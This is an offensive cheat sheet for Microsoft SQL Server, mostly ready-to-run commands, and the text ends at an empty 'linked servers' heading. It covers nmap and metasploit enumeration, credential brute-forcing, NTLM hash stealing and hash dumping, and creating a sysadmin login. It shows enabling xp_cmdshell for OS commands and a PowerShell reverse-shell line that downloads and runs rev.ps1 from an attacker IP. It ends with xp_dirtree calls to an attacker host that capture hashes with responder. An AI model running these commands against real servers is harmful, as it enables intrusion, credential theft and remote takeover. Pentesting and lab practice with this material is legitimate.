## Enumeration 
### banner grabbing 
```bash
# nmap mssql scripts
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <IP>

# metasploit
use auxiliary/scanner/mssql/mssql_ping
```
### bruteforce login 
```bash
# Impacket mssqlclient
mssqlclient.py <DOMAIN>/<USERNAME>:<PASSWORD>@<IP>
mssqlclient.py <DOMAIN>/<USERNAME>:<PASSWORD>@<IP> -windows-auth

# sqsh
sqsh -S <IP> -U <Username> -P <Password> -D <Database>
sqsh -S <IP> -U .\\<Username> -P <Password> -D <Database>

# crackmapexec
cme mssql <IP> -u user -p Password1
cme mssql <IP> -u user -p Password1 --local-auth
```

### credentialed enumeration (metasploit)
```bash
# Set USERNAME, RHOSTS and PASSWORD
# Set DOMAIN and USE_WINDOWS_AUTHENT if domain is used

# Steal NTLM
msf> use auxiliary/admin/mssql/mssql_ntlm_stealer #Steal NTLM hash, before executing run Responder

# Info gathering
msf> use admin/mssql/mssql_enum #Security checks
msf> use admin/mssql/mssql_enum_domain_accounts
msf> use admin/mssql/mssql_enum_sql_logins
msf> use auxiliary/admin/mssql/mssql_findandsampledata
msf> use auxiliary/scanner/mssql/mssql_hashdump
msf> use auxiliary/scanner/mssql/mssql_schemadump

# Search for insteresting data
msf> use auxiliary/admin/mssql/mssql_findandsampledata
msf> use auxiliary/admin/mssql/mssql_idf
```

### common enum queries
```bash
# Get version
select @@version;
# Get user
select user_name();
# Get databases
SELECT name FROM master.dbo.sysdatabases;
# Use database
USE master

# Get table names
SELECT * FROM <databaseName>.INFORMATION_SCHEMA.TABLES;
# List Linked Servers
EXEC sp_linkedservers
SELECT * FROM sys.servers;
# List users
select sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') order by sp.name;
# Create user with sysadmin privs
CREATE LOGIN hacker WITH PASSWORD = 'P@ssword123!'
EXEC sp_addsrvrolemember 'hacker', 'sysadmin'
```

### execute OS commands
```bash
# check is xp_cmdshell is enabled
SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';

# This turns on advanced options and is needed to configure xp_cmdshell
sp_configure 'show advanced options', '1'
RECONFIGURE
#This enables xp_cmdshell
sp_configure 'xp_cmdshell', '1'
RECONFIGURE

#One liner
sp_configure 'Show Advanced Options', 1; RECONFIGURE; sp_configure 'xp_cmdshell', 1; RECONFIGURE;

# crackmapexec
crackmapexec mssql -d <Domain name> -u <username> -p <password> -x "whoami"

# Quickly check what the service account is via xp_cmdshell
EXEC master..xp_cmdshell 'whoami'

# Get Rev shell (w/ Nishang rev.ps1) - https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1
EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.13:8000/rev.ps1") | powershell -noprofile'
```


### Privesc modules 
```bash
# mssql link crawler
use exploit/windows/mssql/mssql_linkcrawler

# If the user has IMPERSONATION privilege, this will try to escalate
use admin/mssql/mssql_escalate_execute_as

# Escalte from db_owner to sysadmin
use admin/mssql/mssql_escalate_dbowner 

# Add new admin user from meterpreter session
use windows/manage/mssql_local_auth_bypass

# crackmapexec mssql_priv
crackmapexec mssql <IP> -u user -p password -M mssql_priv
crackmapexec mssql <IP> -u user -p password -M mssql_priv -o ACTION=privesc
```

## Exploiting MSSQL 
### NetNTLM hash/relay attack 
```bash
xp_dirtree '\\<attacker_IP>\any\thing'
exec master.dbo.xp_dirtree '\\<attacker_IP>\any\thing'
EXEC master..xp_subdirs '\\<attacker_IP>\anything\'
EXEC master..xp_fileexist '\\<attacker_IP>\anything\'

# Capture hash w/ responder
sudo responder -I tun0
sudo impacket-smbserver share ./ -smb2support

# Capture hash w/ metasploit
use auxiliary/admin/mssql/mssql_ntlm_stealer
```

### Abusing MSSQL linked servers


